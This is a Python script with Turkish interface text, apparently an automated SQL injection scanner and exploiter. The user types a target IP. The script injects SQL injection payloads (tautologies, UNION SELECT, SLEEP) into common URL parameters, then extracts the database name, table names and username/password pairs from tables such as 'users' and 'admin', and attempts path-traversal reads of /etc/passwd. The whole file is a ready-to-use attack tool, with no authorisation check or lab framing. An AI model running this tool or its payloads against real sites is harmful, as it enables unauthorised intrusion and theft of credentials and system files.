#!/usr/bin/env python3
"""
SQLi OTOMATİK TEST - IP GİR ÇALIŞTIR
Developer: BüyükXan
Kullanım: python3 sqli_test.py
"""

import requests
import time
import sys
import re
from urllib.parse import urlparse

# Renkler
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class SQLiTester:
    def __init__(self):
        self.target_ip = ""
        self.base_url = ""
        self.results = []
        self.vuln_found = False
        
        # Payload'lar
        self.payloads = [
            ("' OR '1'='1", "Temel SQLi"),
            ("' OR 1=1--", "SQLi Yorum"),
            ("' UNION SELECT NULL--", "Union 1"),
            ("' UNION SELECT NULL,NULL--", "Union 2"),
            ("' AND SLEEP(5)--", "Zaman Tabanlı"),
            ("' OR '1'='1' ;--", "Stacked Sorgu"),
            ("' OR 1=1 LIMIT 1--", "Limit Bypass"),
            ("admin'--", "Login Bypass"),
        ]
        
        # Parametreler
        self.params = ['id', 'page', 'user', 'file', 'cat', 'product', 'article', 'news', 'detail', 'q', 'search']
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def print_banner(self):
        banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.YELLOW}🔍 SQLi OTOMATİK TEST V2 🔍{Colors.RED}                    ║
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.CYAN}Developer : BüyükXan | Developer Xan{Colors.RED}         ║
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.GREEN}IP Gir -> Otomatik SQLi Test{Colors.RED}                  ║
{Colors.RED}║                                                               ║
{Colors.RED}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def set_target(self):
        print(f"{Colors.CYAN}[+] Hedef IP veya URL girin:{Colors.RESET}")
        print(f"{Colors.YELLOW}Örnek: 2.20.45.49 veya http://2.20.45.49{Colors.RESET}")
        target = input("➜ ").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self.base_url = target
        self.target_ip = target.replace('http://', '').replace('https://', '').split('/')[0]
        
        print(f"{Colors.GREEN}✅ Hedef: {self.base_url}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ IP: {self.target_ip}{Colors.RESET}\n")
    
    def test_sqli(self):
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}         🔍 SQLi TARAMASI BAŞLIYOR{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        total_tests = len(self.params) * len(self.payloads)
        current = 0
        
        for param in self.params:
            for payload, desc in self.payloads:
                current += 1
                test_url = f"{self.base_url}?{param}={payload}"
                
                try:
                    # Zaman ölçümü
                    start = time.time()
                    r = self.session.get(test_url, timeout=10)
                    elapsed = time.time() - start
                    
                    # Hata kontrolü
                    errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'ora-', 'microsoft ole db',
                             'driver', 'syntax error', 'warning', 'mysqli', 'PDO', 'SQLSTATE',
                             'Invalid URL', 'Bad Request']
                    
                    if any(e in r.text.lower() for e in errors):
                        print(f"{Colors.GREEN}✅ SQL HATASI BULUNDU!{Colors.RESET}")
                        print(f"   {Colors.YELLOW}Parametre:{Colors.RESET} {param}")
                        print(f"   {Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                        print(f"   {Colors.YELLOW}Açıklama:{Colors.RESET} {desc}")
                        print(f"   {Colors.RED}Hata:{Colors.RESET} {r.text[:150]}")
                        print(f"   {Colors.BLUE}URL:{Colors.RESET} {test_url}\n")
                        
                        self.results.append({
                            'param': param,
                            'payload': payload,
                            'desc': desc,
                            'url': test_url,
                            'error': r.text[:150]
                        })
                        self.vuln_found = True
                    
                    # Zaman tabanlı
                    if elapsed > 4:
                        print(f"{Colors.GREEN}✅ ZAMAN TABANLI SQLI BULUNDU!{Colors.RESET}")
                        print(f"   {Colors.YELLOW}Parametre:{Colors.RESET} {param}")
                        print(f"   {Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                        print(f"   {Colors.YELLOW}Yanıt Süresi:{Colors.RESET} {elapsed:.2f} sn")
                        print(f"   {Colors.BLUE}URL:{Colors.RESET} {test_url}\n")
                        
                        self.results.append({
                            'param': param,
                            'payload': payload,
                            'desc': desc,
                            'url': test_url,
                            'time': elapsed
                        })
                        self.vuln_found = True
                    
                    # Progress
                    if current % 10 == 0:
                        print(f"{Colors.YELLOW}[*] İlerleme: {current}/{total_tests}{Colors.RESET}")
                        
                except requests.exceptions.ConnectionError:
                    print(f"{Colors.RED}❌ Bağlantı hatası: {test_url}{Colors.RESET}")
                except requests.exceptions.Timeout:
                    print(f"{Colors.YELLOW}⚠️ Zaman aşımı: {test_url}{Colors.RESET}")
                except Exception as e:
                    pass
        
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}         ✅ TARAMA TAMAMLANDI!{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
    
    def exploit(self):
        """Bulunan zafiyeti kullanarak veri çek"""
        if not self.results:
            print(f"{Colors.RED}❌ Zafiyet bulunamadı, exploit yapılamaz.{Colors.RESET}")
            return
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}         🔓 EXPLOIT BAŞLIYOR{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        # İlk bulunan zafiyeti kullan
        vuln = self.results[0]
        param = vuln['param']
        
        print(f"{Colors.CYAN}[+] Kullanılan parametre: {param}{Colors.RESET}\n")
        
        # 1. Veritabanı adı
        print(f"{Colors.YELLOW}[*] Veritabanı adı alınıyor...{Colors.RESET}")
        try:
            url = f"{self.base_url}?{param}=1' UNION SELECT database()--"
            r = self.session.get(url, timeout=5)
            if r.text:
                db_name = re.sub(r'<[^>]+>', '', r.text).strip()[:100]
                print(f"{Colors.GREEN}✅ Veritabanı: {db_name}{Colors.RESET}")
                self.results.append({'type': 'database', 'data': db_name})
        except:
            print(f"{Colors.RED}❌ Veritabanı alınamadı{Colors.RESET}")
        
        # 2. Tablolar
        print(f"\n{Colors.YELLOW}[*] Tablolar listeleniyor...{Colors.RESET}")
        try:
            url = f"{self.base_url}?{param}=1' UNION SELECT table_name FROM information_schema.tables LIMIT 5--"
            r = self.session.get(url, timeout=5)
            if r.text:
                tables = re.sub(r'<[^>]+>', '', r.text).strip()
                print(f"{Colors.GREEN}✅ Tablolar: {tables[:200]}{Colors.RESET}")
                self.results.append({'type': 'tables', 'data': tables[:200]})
        except:
            print(f"{Colors.RED}❌ Tablolar alınamadı{Colors.RESET}")
        
        # 3. Kullanıcılar
        print(f"\n{Colors.YELLOW}[*] Kullanıcı bilgileri çekiliyor...{Colors.RESET}")
        for table in ['users', 'admin', 'user', 'accounts']:
            try:
                url = f"{self.base_url}?{param}=1' UNION SELECT username,password FROM {table}--"
                r = self.session.get(url, timeout=5)
                if r.text and len(r.text) > 20:
                    data = re.sub(r'<[^>]+>', '', r.text).strip()
                    print(f"{Colors.GREEN}✅ {table} tablosu: {data[:200]}{Colors.RESET}")
                    self.results.append({'type': table, 'data': data[:200]})
                    break
            except:
                pass
        
        # 4. Dosya okuma (LFI)
        print(f"\n{Colors.YELLOW}[*] Dosya okuma deneniyor...{Colors.RESET}")
        files = ['/etc/passwd', '../../../../etc/passwd', '../../../etc/passwd']
        for file in files:
            try:
                url = f"{self.base_url}?{param}={file}"
                r = self.session.get(url, timeout=5)
                if 'root:' in r.text or 'bin:' in r.text:
                    print(f"{Colors.GREEN}✅ Dosya okundu: {file}{Colors.RESET}")
                    print(f"{Colors.CYAN}İçerik: {r.text[:200]}{Colors.RESET}")
                    self.results.append({'type': 'lfi', 'file': file, 'data': r.text[:200]})
                    break
            except:
                pass
    
    def show_report(self):
        """Rapor göster"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}         📊 RAPOR{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}[+] Hedef: {self.base_url}{Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Zafiyet Durumu: {Colors.GREEN}BULUNDU ✅{Colors.RESET}" if self.vuln_found else f"{Colors.RED}BULUNAMADI ❌{Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Toplam Test: {len(self.params) * len(self.payloads)}{Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Bulunan Zafiyet: {len(self.results)}{Colors.RESET}\n")
        
        if self.results:
            print(f"{Colors.BOLD}{Colors.CYAN}--- BULGULAR ---{Colors.RESET}")
            for i, res in enumerate(self.results, 1):
                if 'param' in res:
                    print(f"{i}. {Colors.GREEN}SQLi{Colors.RESET} - {res['desc']}")
                    print(f"   Parametre: {res['param']}")
                    print(f"   Payload: {res['payload']}")
                elif 'type' in res:
                    print(f"{i}. {Colors.YELLOW}{res['type'].upper()}{Colors.RESET} - {res.get('data', '')[:100]}")
                print()
        
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
    
    def run(self):
        self.print_banner()
        self.set_target()
        self.test_sqli()
        
        if self.vuln_found:
            choice = input(f"\n{Colors.CYAN}[+] Exploit yapılsın mı? (y/n): {Colors.RESET}")
            if choice.lower() == 'y':
                self.exploit()
        
        self.show_report()

if __name__ == "__main__":
    try:
        tester = SQLiTester()
        tester.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[+] Kullanıcı tarafından durduruldu.{Colors.RESET}")
        sys.exit(0)
